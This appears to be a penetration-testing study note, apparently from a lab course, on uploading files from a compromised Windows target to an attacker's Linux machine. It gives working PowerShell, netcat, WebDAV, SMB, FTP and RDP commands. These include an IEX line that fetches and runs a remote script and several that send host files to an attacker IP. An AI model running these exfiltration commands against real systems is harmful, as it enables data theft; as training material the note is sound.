# Uploading
Situations: password cracking, analysis, exfiltration,..
- Upload files from Windows target machine onto our Linux machine 

## Powershell Bas64 Encode Decode
1. Get Hash on Windows
	- `Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash`
2. Encode File with Powershell on Windows
	- `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
3. Copy and paste into Linux
4. Decode File in Linux
	- `echo <the long string> | base64 -d > hosts`
5. Check the host
	- `md5sum hosts`

## Powershell Web Uploads

*Configured WebServer with Upload*
1. On Linux,
	- `pip3 install uploadserver`
	- `python3 -m uploadserver`
		- Now hosting a server at port 8000
2. On Windows,
	- `IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
		- We need this script to upload the file to Linux
	- `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

*Powershell base 64 web upload*
1. On Linux,
	- `nc -lvnp 8000
2. On Windows,
	- `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
	- `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
3. On Linux,
	- `echo <base64> | base64 -d -w 0 > hosts

# SMB Uploads
- Companies usually allow outbound traffic using HTTP and HTTPS (80, 443) protocols.
- Usually dont allow SMB (445) as it leaves them open to attacks
- Alternative: run SMB over HTTP with WebDav.WebDAV
	- WebDav is an extension of HTTP
	- Enables webserver to behave like fileserver

*To configure WebDav server*
1. On Linux, configure the WebDav server
	- `sudo pip3 install wsgidav cheroot`
	- `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
2. On Windows,
	- `dir \\192.168.49.128\DavWWWRoot`
		- DavWWWRoot is special keyword recognized by Windows shell
		- Tells it to connect to root of WebDav server
3. To upload files, on Windows
	- `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\`

If there are no SMB (TCP/445) restrictions, can use impacket-smbserver just like in [[1. Windows Downloads]]

1. On Linux, start the smb server
	- `sudo impacket-smbserver share -smb2support .`
		- can replace . with whatever existing directory
2. On Windows target, copy the file to share
	- `Copy-Item -Path 'C:\path\to\file.txt' -Destination '\\10.10.14.1\SHARE\file.txt'`

# FTP Uploads
1. Configure FTP server in our machine
	- `sudo pip3 install pyftpdlib`
	- `sudo python3 -m pyftpdlib --port 21 -- write
		- --write to allow target to upload files to us
2. Then on Windows
	- `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`
3. If no interactive shell,
	- `echo open 192.168.49.128 > ftpcommand.txt`
	- `echo USER anonymous >> ftpcommand.txt`
	- `echo binary >> ftpcommand.txt`
	- `echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt`
	- `echo bye >> ftpcommand.txt`
	- `ftp -v -n -s:ftpcommand.txt`


# RDP Transfer (to and fro)

1. Mount Linux Folder
	- `rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'`
	- or
	- `xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer`
	- The IP, u and p are for the Windows machine. Am mounting the linux drive folder onto the Windows machine
	- d is domain
2. On Windows, 
	- Connect to `\\tsclient\` in file explorer
		- Network > tsclient
